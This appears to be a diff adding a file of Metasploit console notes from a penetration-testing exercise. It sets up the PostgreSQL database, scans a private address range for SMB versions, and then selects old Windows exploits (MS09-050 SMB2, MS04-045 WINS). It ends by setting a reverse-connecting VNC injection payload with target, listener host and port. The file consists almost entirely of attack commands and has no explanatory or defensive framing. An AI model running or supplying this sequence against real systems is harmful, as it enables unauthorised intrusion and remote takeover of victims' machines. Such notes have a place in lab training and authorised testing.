@@ -1,0 +1,41 @@
+msfconsole
+
+ifconfig
+
+sudo systemctl status postgresql
+
+sudo systemctl start postgresql
+
+sudo systemctl enable postgresql
+
+sudo -u postgres psql
+
+--version
+sudo systemctl restart postgresql
+
+db_status
+
+show options
+
+use scanner/smb/smb_version
+
+auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.50.100-211
+auxiliary(scanner/smb/smb_version) > set THREADS 100
+auxiliary(scanner/smb/smb_version) > show options
+auxiliary(scanner/smb/smb_version) > run
+auxiliary(scanner/smb/smb_version) > hosts
+auxiliary(scanner/smb/smb_version) > use exploit/
+auxiliary(scanner/smb/smb_version) > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+
+(exploit/windows/smb/ms09_050_smb2_negotiate_func_index) > help
+(exploit/windows/smb/ms09_050_smb2_negotiate_func_index) > show exploits
+(exploit/windows/smb/ms09_050_smb2_negotiate_func_index) > use exploit/windows/wins/ms04_045_wins
+
+(exploit/windows/wins/ms04_045_wins) > help
+(exploit/windows/wins/ms04_045_wins) > show targets
+(exploit/windows/wins/ms04_045_wins) > show payloads
+(exploit/windows/wins/ms04_045_wins) > show options
+(exploit/windows/wins/ms04_045_wins) > set PAYLOAD payload/windows/x64/vncinject/reverse_winhttps
+(exploit/windows/wins/ms04_045_wins) > set RHOSTS 192.168.1.100
+(exploit/windows/wins/ms04_045_wins) > set LHOST 192.168.1.5
+(exploit/windows/wins/ms04_045_wins) > set LPORT 4444
